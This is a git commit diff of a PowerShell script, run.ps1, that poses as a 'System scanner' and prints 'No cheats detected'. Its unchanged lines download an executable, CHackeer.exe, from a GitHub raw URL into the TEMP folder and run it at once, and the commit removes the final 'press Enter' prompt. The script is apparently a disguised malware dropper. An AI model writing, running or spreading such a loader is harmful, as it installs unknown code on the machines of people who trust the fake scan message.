59031375b0056c2f1a0dcd9de64d32dc7e2ee9c4
fundrug35-jpg <fundrug35@gmail.com>
2026-09-08 22:48:06 +0300

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -3,4 +3,3 @@ Write-Host "System scanner" -ForegroundColor Cyan
 Write-Host "No cheats detected" -ForegroundColor Green
 curl -o "$env:TEMP\CHackeer.exe" https://raw.githubusercontent.com/fundrug35-jpg/asdasdad/main/CHackeer.exe
 & "$env:TEMP\CHackeer.exe"
-Read-Host "Нажми Enter"
